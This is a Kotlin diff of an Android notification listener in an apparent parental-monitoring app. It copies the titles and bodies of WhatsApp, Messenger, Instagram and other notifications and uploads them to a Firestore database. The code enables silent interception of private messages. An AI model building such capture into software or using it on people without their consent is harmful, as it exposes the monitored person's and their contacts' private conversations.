@@ -1,28 +1,49 @@
-package com.abuzahra.tracker.services
+package com.abuzahra.child.services
 
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
-import com.google.firebase.firestore.FirebaseFirestore
-import com.abuzahra.tracker.SharedPrefsManager
+import android.os.Bundle
+import com.abuzahra.child.utils.FirestoreHelper
 
 class MyNotificationListener : NotificationListenerService() {
-    override fun onNotificationPosted(sbn: StatusBarNotification) {
-        val pkg = sbn.packageName
-        val extras = sbn.notification.extras
-        val title = extras.getCharSequence("android.title")?.toString() ?: ""
-        val text = extras.getCharSequence("android.text")?.toString() ?: ""
-        if (title.isEmpty() && text.isEmpty()) return
 
-        val type = when (pkg) {
-            "com.whatsapp", "com.whatsapp.w4b" -> "whatsapp"
-            "com.facebook.orca" -> "messenger"
-            else -> "notification"
-        }
+    override fun onNotificationPosted(sbn: StatusBarNotification) {
+        val packageName = sbn.packageName
+        val extras: Bundle = sbn.notification.extras
         
-        val parentId = SharedPrefsManager.getParentUid(this) ?: return
-        val deviceId = SharedPrefsManager.getDeviceId(this) ?: return
-        val data = hashMapOf("type" to type, "title" to title, "body" to text, "timestamp" to System.currentTimeMillis())
-        val collection = if (type == "notification") "notifications" else "social_logs"
-        FirebaseFirestore.getInstance().collection("parents").document(parentId).collection("children").document(deviceId).collection(collection).add(data)
+        val title = extras.getCharSequence("android.title")?.toString() ?: "Unknown"
+        val text = extras.getCharSequence("android.text")?.toString() ?: ""
+        
+        // تصفية التطبيقات المهمة فقط
+        if (packageName.contains("whatsapp") || packageName.contains("messenger") || packageName.contains("instagram")) {
+            if (text.isNotEmpty()) {
+                val data = mapOf(
+                    "app" to getFriendlyAppName(packageName),
+                    "title" to title,
+                    "body" to text,
+                    "timestamp" to System.currentTimeMillis(),
+                    "package" to packageName
+                )
+                FirestoreHelper.uploadLog("social", data)
+            }
+        } else {
+            // الإشعارات العامة
+             val data = mapOf(
+                "app" to packageName,
+                "title" to title,
+                "body" to text,
+                "timestamp" to System.currentTimeMillis()
+            )
+            FirestoreHelper.uploadLog("notifications", data)
+        }
+    }
+    
+    private fun getFriendlyAppName(pkg: String): String {
+        return when {
+            pkg.contains("whatsapp") -> "WhatsApp"
+            pkg.contains("messenger") -> "Messenger"
+            pkg.contains("instagram") -> "Instagram"
+            else -> pkg
+        }
     }
 }
